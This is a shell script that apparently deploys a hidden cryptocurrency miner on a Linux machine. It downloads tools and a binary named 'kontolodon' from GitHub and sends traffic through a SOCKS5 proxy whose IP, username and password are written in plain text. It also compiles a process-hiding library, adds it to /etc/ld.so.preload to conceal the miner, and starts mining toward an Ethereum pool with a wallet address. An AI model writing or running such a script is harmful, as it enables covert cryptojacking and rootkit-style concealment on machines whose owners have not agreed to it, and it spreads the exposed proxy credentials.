#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
apt-get install libpci3
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233 
loglevel = 1 
socks5 = 143.198.171.112:1080 
socks5_username = mikrotik999 
socks5_password = Elibawnos 
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/potential-train/main/kontolodon
chmod +x kontolodon

./graftcp/graftcp wget https://raw.githubusercontent.com/potential-train/main/kontolodon.zip
unzip kontolodon.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./kontolodon -pool us-eth.2miners.com:2020 -wal nano_3de5768bnrjiunbjhup1frf7ejk6asr4h961j6txg8qmiy36jehhxz89qca1.Berkah -pass x -stales 0
